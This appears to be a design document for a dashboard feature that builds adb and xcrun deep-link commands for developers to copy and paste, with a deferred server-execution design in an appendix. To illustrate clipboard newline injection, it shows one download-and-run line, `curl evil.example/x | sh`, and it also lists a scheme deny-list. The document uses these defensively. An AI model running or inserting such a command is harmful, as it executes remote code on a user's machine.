## Context

Entity links (`config.EntityLink`: `Label`, `Template`) resolve `{{column}}` placeholders client-side against a row's own fields (`dashboard/ensemble-ui/src/format.ts:resolveLinkTemplate`) and are opened via `window.open` (http/https) or `location.assign` (everything else) in `EntityView.tsx`. This works for web URLs and for custom schemes registered with an app installed on the same machine as the browser, but there is no way to route a deep link to a **connected Android device or iOS Simulator** — that requires invoking `adb`/`xcrun` from a terminal, which the browser cannot do.

An earlier draft explored a server-side executor: `POST /api/entities/{name}/exec`, re-fetching the row by id and running a whitelisted command via `exec.Command`. Two rounds of review against the actual codebase (`core/httpguard`, `cmd_up.go:apiHostPolicy`, `orchestrator/seed.go`) found this would be the first request-content-to-argv path in an otherwise fully unauthenticated local API, and that a wildcard `--api 0.0.0.0` bind (which only warns today, does not refuse) would make it unauthenticated LAN-reachable process execution against a USB-attached phone. That design is preserved in full at the bottom of this document as a deferred v2 and is **not being built now**.

This design covers the copy-to-clipboard alternative: the dashboard assembles the exact CLI command and copies it; the developer pastes and runs it themselves.

## Goals / Non-Goals

**Goals:**
- Eliminate hand-assembly of `adb`/`xcrun` commands as a step in the local dev loop.
- Add no new server-side execution surface, no new HTTP route, no auth/CSRF/bind changes.
- Keep the command set closed (Go-authored, validated at config load) rather than config-extensible, since `ensemble.yaml` is a file that travels between machines and gets reviewed in PRs, not typed ad hoc.
- Never silently produce a broken or unsafe command — disable the button with a reason instead.

**Non-Goals:**
- Server-side auto-execution of the command (deferred; see Appendix).
- Config-level extensibility of the command table (adding a command is a Go change + code review, by design).
- Cross-platform shell-quoting beyond POSIX (`sh`/`bash`/`zsh`) — target is a developer's own Mac terminal, per the driving use case.
- Changing `kind: url` link behavior in any way.

## Decisions

**D1 — Copy-to-clipboard, not server-side exec, for v1.**
Rationale: the row data needed to build the command is already in the browser (same as `kind: url` links today); no server round-trip is required. This removes the entire class of risk the earlier design had to defend against (CSRF, non-loopback bind, server-side row-trust) because there is no new mutating endpoint. Alternative considered: ship the server-exec design with all its guards (loopback refusal, per-process CSRF token, server-side row re-fetch) — rejected for v1 as disproportionate machinery for the actual friction (hand-assembling a command), which copy-to-clipboard fully resolves.

**D2 — The command table stays Go-authoritative; no new endpoint.**
`config/execcommands.go` holds the closed table (`ios-simctl-openurl`, `adb-view`) as `[]string` argv templates with one sentinel element `"{{url}}"` per entry. `config/validate.go` validates `exec:` against this table at `ensemble up` — an unknown name is a startup error, not a silently dead button. The table is exposed to the dashboard by expanding it into the existing `GET /api/entities` response (`entityLink` gains `kind` and `argv`); the `exec:` key itself is never sent to the client. Alternative considered: define the table in TypeScript instead — rejected because the Go-side validation of `exec:` would then have nothing to check against, turning a typo'd `exec:` name into a button that does nothing rather than a startup error.

**D3 — Command strings are quoted for the developer's own shell, not left raw.**
`format.ts` gains `shellQuote(s) = "'" + s.replace(/'/g, "'\\''") + "'"` (POSIX single-quote escaping) applied to the resolved URL as it's substituted into the `{{url}}` argv slot; literal argv elements from the table (binary name, flags) are never quoted. Without this, an ordinary deep link containing `&` or `?` (e.g. `myapp://widget?a=1&b=2`) would be word-split or backgrounded by the shell on paste — not a security issue by itself, but a correctness one that would make the feature look broken on the common case. Both `ios-simctl-openurl` and `adb-view` are quoted identically in v1, because both commands are now destined for the developer's own shell via paste (this is an inversion from the deferred v2 design, where `adb-view` was quoted because its args reach a shell *on the phone* and `ios-simctl-openurl` was deliberately *not* quoted because it's a direct `exec.Command` with no shell in the chain at all — see Appendix D3-v2).

**D4 — One validation rule survives from the security-motivated set, because the threat model changed shape rather than disappearing.**
The resolved command is going onto the system clipboard for a human to paste into a shell. A row field containing a newline does not produce a broken command — it produces two lines, and in a terminal without bracketed-paste enabled (not universal; disabled by plenty of dotfiles), the second line executes on paste before the developer has read or approved anything:
```
myapp://widget/abc
curl evil.example/x | sh
```
Mitigation: **a resolved command containing any ASCII control character (< 0x20 or 0x7F) is never produced** — the button renders disabled with that reason instead. This is the one rule from the original design that still does real work; it is not merely UX polish.

**D5 — Config-load validation, not just render-time.**
`kind: exec` requires the template's literal scheme (the text before the first `{{`) to match `^[a-zA-Z][a-zA-Z0-9+.\-]*:` — i.e., the scheme is config-authored, never sourced from a row column. Rationale is UX, not security: a row-sourced scheme silently degrades to `://widget/abc` the moment that column is missing or renamed, and the developer gets a plausible-looking but non-functional command. Catching this at `ensemble up`, where the error can name the entity and link, beats discovering it per-row in the browser. This is fatal (fails startup), matching the existing severity of other link-config errors.

**D6 — Render-time: missing template columns disable the button rather than rendering a broken command.**
`kind: url` links today happily render a broken URL if a column is missing (empty-string substitution). For `kind: exec`, a missing column instead disables the button with the missing column name as the reason. This is intentionally stricter than `kind: url` — a copied command that looks right but targets the wrong thing is worse than a visibly broken link — and is a deliberate inconsistency between the two kinds, not an oversight.

**D7 — The button always shows the full command as its tooltip (`title`).**
Non-negotiable for a paste-and-run feature: a developer should never be asked to paste something they have not been shown. This also makes a two-line (control-character) command visible to a human before D4's disable logic even applies, as a second layer.

**D8 — Labels avoid the verb "copy".**
Example config uses `"Open on Android"` / `"Open on iOS Simulator"` rather than `"Copy Android command"`, so the label doesn't become misleading if a future v2 adds real auto-execution behind the same config shape.

## Risks / Trade-offs

- **[Risk] Newline/control-char injection via row data still reaches the clipboard as a truncated-but-safe string, not a helpful error, if D4's check has a gap.** → Mitigation: table-driven tests covering control chars, embedded quotes, and normal cases in `buildExecCommand`; the check runs on the fully-resolved command string, not just the raw column value, so it also catches control characters introduced by argv template text (there are none today, but the test guards the invariant).
- **[Risk] `xcrun`-only command shown on Linux/Windows is dead weight in the UI.** → Accepted per decision with Steven: always show — a copied string is harmless on the wrong OS, and hiding it would require server-side `GOOS` filtering logic for a cosmetic concern only.
- **[Risk] Literal-scheme rule (D5) being fatal could block `ensemble up` for a config that would otherwise mostly work.** → Accepted per decision with Steven: config errors should be loud; a scheme-from-a-row template is almost certainly a mistake worth surfacing immediately rather than a per-row runtime surprise.
- **[Trade-off] No config-extensibility of the command table.** A developer who wants a third command (e.g. `ios-deploy` for physical devices) needs a Go change and a PR, not a config edit. Accepted: `ensemble.yaml` is committed and shared, so a config-level `command:`/`args:` escape hatch would mean a PR to that file could put an arbitrary command on a teammate's clipboard, one paste away from running. `ensemble exec-commands` (or equivalent doc) is the sanctioned path to see and propose additions.
- **[Trade-off] Bracketed-paste is not universal, so D4 is doing real work rather than being defense-in-depth for a closed hole.** No further mitigation is proposed for v1 beyond D4 + D7 (visible full command); a stronger control (e.g. refusing to copy if the *source data*, not just the resolved command, looks anomalous) is out of scope.

## Migration Plan

Additive only — `kind` defaults to `url` (today's only behavior), so no existing config or behavior changes. No data migration, no rollback concerns beyond a normal revert. Deploy as a standard ensemble release; no feature flag needed since the surface is entirely opt-in via new config.

## Open Questions

All resolved for v1 (recorded here for traceability):
1. Command preview: tooltip (`title`) only — decided, not a visible inline `<code>` row, to keep the entity table compact.
2. Platform filtering: always show both commands regardless of host OS — decided, since a copied string is harmless on the wrong platform.
3. Literal-scheme rule (D5): fatal at config load — decided.
4. Missing-column behavior (D6): disable the button with a reason — decided.
5. Label wording: avoid "copy" as a verb (D8) — decided.

---

## Appendix — Deferred v2: server-side auto-execution

Not being built in this change. Recorded here so a future proposal doesn't have to re-derive it, and so the quoting inversion in D3 has its counterpart on record.

- **Endpoint**: `POST /api/entities/{entity}/links/{link}/exec`, body `{"id": "..."}` only (`DisallowUnknownFields`; a client sending `row` gets `400`). Server re-fetches the row itself via the entity's existing proxy — never trusts client-submitted row content or a client-resolved URL.
- **Loopback gate**: `apiHostPolicy` (`cmd_up.go`) sets `AllowedHosts: ["*"]` on a wildcard `--api` bind, which turns off `httpguard`'s Host *and* Origin matching entirely — so an auto-exec endpoint reachable that way would be unauthenticated LAN-reachable process execution against a USB-attached device. v2 would need to **refuse** (403, with a reason surfaced in `GET /api/entities`) rather than warn.
- **CSRF**: `httpguard` already rejects `Sec-Fetch-Site: cross-site` outright, which closes the browser-CSRF path on any browser since ~2023. Residual exposure is pre-2023 Safari and non-browser local callers (who could invoke `adb` directly anyway). A per-process `crypto/rand` token, minted at `ensemble up` and returned only over a same-origin `GET`, was recommended as cheap defense-in-depth — but the actual control is the server-side row re-fetch, not the token.
- **Device-shell quoting (D3-v2, the inversion)**: `adb shell` executes a shell **on the phone** — `exec.Command` argv-only on the host does not protect that. `adb-view`'s argv builder would need to single-quote the URL for the device's shell; `ios-simctl-openurl` (`xcrun simctl openurl`, a direct exec with no shell anywhere) must **not** be quoted, since quotes would land literally inside the URL. This is the opposite of v1's D3, where both are quoted because both go through the developer's own shell.
- **Dropped-in-v1 validation, reinstated in v2**: length cap, `url.Parse`-must-succeed, single-quote ban (v1 escapes instead), and a scheme deny-list (`file`, `jar`, `data`, `javascript`, `vbscript`) — all exist to bound an adversarial input path that only exists once a server executes on the client's behalf.
- **Config schema delta**: v2 would need a `name:` slug back on exec links (route identity for `POST /api/entities/{entity}/links/{link}/exec`; array index is unsafe under config hot-reload). Nothing else in the v1 schema would need to be undone.
